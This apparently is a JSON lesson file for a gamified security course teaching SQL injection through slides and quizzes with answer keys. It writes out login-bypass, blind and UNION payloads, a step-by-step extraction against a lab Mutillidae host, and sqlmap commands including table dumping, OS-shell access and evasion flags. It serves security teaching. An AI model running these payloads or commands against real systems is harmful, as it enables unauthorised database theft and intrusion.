@@ -1,0 +1,126 @@
+{
+    "id": "l3",
+    "chapterId": "ch_8",
+    "title": "SQL Injection (SQLi) 💉",
+    "description": "Learn to extract databases through vulnerable input fields.",
+    "xpReward": 45,
+    "estimatedMinutes": 15,
+    "section": "Injection",
+    "slides": [
+        {
+            "id": "s_l3_1",
+            "type": "text",
+            "title": "What is SQL Injection? 🗄️",
+            "content": "# Breaking the Query\n\n**SQL (Structured Query Language)** is used to communicate with databases. A typical login query looks like:\n```sql\nSELECT * FROM users WHERE username = 'admin' AND password = 'secret';\n```\n\n**SQL Injection** occurs when an attacker can insert malicious SQL code into an input field, changing the logic of the query.\n\n**Analogy**: The application asks for your name, and you reply: *\"John. Now delete the users table.\"* If the application blindly trusts you, the database obeys."
+        },
+        {
+            "id": "s_l3_2",
+            "type": "text",
+            "title": "The Classic Login Bypass 🚪",
+            "content": "# ' OR 1=1 -- \n\n**Vulnerable Code (PHP):**\n```php\n$query = \"SELECT * FROM users WHERE username = '\" . $_POST['user'] . \"' AND password = '\" . $_POST['pass'] . \"'\";\n```\n\n**Attacker Input (Username):** `admin' OR '1'='1' -- `\n\n**Resulting Query:**\n```sql\nSELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = 'anything';\n```\n\n**Explanation:**\n- `OR '1'='1'` is always true.\n- `-- ` is a comment in SQL. Everything after it is ignored.\n- The query returns **all users** (or the first one). The application sees a result and logs you in!\n\n**Other Login Bypass Payloads:**\n- `admin' -- `\n- `admin' /*`\n- `' OR 1=1#`"
+        },
+        {
+            "id": "s_l3_3",
+            "type": "quiz",
+            "title": "Login Bypass Logic 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l3_1",
+                "type": "multiple_choice",
+                "question": "What is the purpose of the `-- ` sequence in an SQL injection payload?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "To end the SQL statement.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "To comment out the rest of the original query, preventing syntax errors.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "To drop the database.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "To concatenate strings.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "The double dash `--` (followed by a space) starts a comment in SQL, ignoring the remaining query logic.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l3_4",
+            "type": "text",
+            "title": "Types of SQL Injection 🧩",
+            "content": "# In-Band, Blind, and Out-of-Band\n\n**1. In-Band (Classic) SQLi**\n- **Error-Based**: The application displays database errors. Use these to learn table names.\n    - Input: `'` -> Output: `You have an error in your SQL syntax...`\n- **Union-Based**: Use the `UNION` operator to combine the results of the original query with your own malicious query.\n    - Goal: Extract data from other tables.\n\n**2. Blind SQLi**\n- The application does **not** display errors or data. You must infer the answer based on **true/false** behavior or **time delays**.\n    - **Boolean-Based**: `' AND 1=1 -- ` (Page loads normally). `' AND 1=2 -- ` (Page loads differently).\n    - **Time-Based**: `' AND SLEEP(5) -- ` (Page takes 5 seconds to load).\n\n**3. Out-of-Band SQLi**\n- The database makes a connection back to the attacker (e.g., DNS request) to exfiltrate data. Rare but powerful."
+        },
+        {
+            "id": "s_l3_5",
+            "type": "text",
+            "title": "UNION Attacks: Reading Other Tables 📚",
+            "content": "# Combining Queries\n\n**Goal**: Use `UNION` to append your own query and extract data from a different table (e.g., `users`).\n\n**Requirements:**\n1.  **Find Number of Columns**: `' UNION SELECT NULL, NULL, NULL -- ` (increase NULLs until no error).\n2.  **Find Data Types**: Replace NULLs with string types to see where output reflects. `' UNION SELECT 'test', NULL, NULL -- `\n3.  **Extract Data**:\n    ```sql\n    ' UNION SELECT username, password, NULL FROM users --\n    ```\n\n**Finding Table/Column Names (MySQL):**\n- `' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --`\n- `' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --`"
+        },
+        {
+            "id": "s_l3_6",
+            "type": "code",
+            "title": "Manual Union Example 💻",
+            "content": "Testing a vulnerable `id` parameter on DVWA or Metasploitable's Mutillidae.",
+            "codeSnippet": "# Step 1: Identify injection\nhttp://192.168.56.101/mutillidae/index.php?page=user-info.php&username=admin'\n# Output: MySQL Syntax Error -> Vulnerable!\n\n# Step 2: Determine columns (try 1,2,3... until no error)\nhttp://192.168.56.101/mutillidae/index.php?page=user-info.php&username=admin' UNION SELECT 1,2,3,4,5,6,7 -- \n# Output shows numbers 2,3,4 -> These columns are reflected.\n\n# Step 3: Extract data\nhttp://192.168.56.101/mutillidae/index.php?page=user-info.php&username=admin' UNION SELECT 1,database(),user(),4,5,6,7 -- ",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l3_7",
+            "type": "quiz",
+            "title": "Union SQLi 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l3_2",
+                "type": "multiple_choice",
+                "question": "Why do we use a series of `NULL` values in a UNION SELECT statement initially?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "To avoid triggering security alerts.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "To determine the number of columns in the original query.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "To encrypt the payload.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "To test for blind SQLi.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "NULL is compatible with any data type. By incrementing NULLs until the query executes without error, we find the column count.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l3_8",
+            "type": "text",
+            "title": "Automated SQLi: SQLMap 🤖",
+            "content": "# The Heavy Artillery\n\n**SQLMap** is an open-source tool that automates the detection and exploitation of SQL injection flaws.\n\n**Basic Command:**\n```bash\nsqlmap -u \"http://192.168.56.101/mutillidae/index.php?page=user-info.php&username=admin\" --dbs\n```\n\n**Key Flags:**\n- `-u [URL]` : Target URL.\n- `--dbs` : Enumerate databases.\n- `--tables` : Enumerate tables.\n- `--columns` : Enumerate columns.\n- `--dump` : Dump table contents.\n- `--os-shell` : Attempt to get an operating system shell.\n- `--cookie=\"PHPSESSID=abc123\"` : Include session cookie.\n\n**Warning**: SQLMap is **extremely noisy**. It sends hundreds of requests. **Only use on authorized targets.**"
+        },
+        {
+            "id": "s_l3_9",
+            "type": "warning",
+            "title": "SQLMap Risk Level ⚠️",
+            "content": "## You Will Be Detected\n\nUsing SQLMap on a production web application without permission is a fast way to get your IP banned or trigger legal action. Always use the `--delay` and `--random-agent` flags to slow down and obfuscate the scan if you are testing in a controlled environment."
+        }
+    ]
+}
